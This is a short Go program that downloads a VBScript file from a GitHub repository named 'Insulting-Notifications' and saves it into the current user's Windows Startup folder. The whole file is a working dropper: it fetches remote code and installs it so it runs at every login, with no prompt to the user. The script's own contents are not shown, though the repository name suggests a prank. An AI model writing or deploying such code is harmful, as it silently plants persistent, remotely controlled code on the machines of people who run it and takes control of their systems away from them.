package main

import (
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
)

func main() {
	url := "https://raw.githubusercontent.com/BlueIncog/Insulting-Notifications/main/test.vbs"

	dir, err := os.UserHomeDir()
	if err != nil {
		log.Fatalf("failed to get user home dir: %v", err)
	}

	path := filepath.Join(dir, "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/test.vbs")
	if err := DownloadFile(path, url); err != nil {
		log.Fatalf("failed to download file: %v", err)
	}
}

// DownloadFile will download a url to a local file. It's efficient because it will
// write as it downloads and not load the whole file into memory.
func DownloadFile(filepath string, url string) error {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}
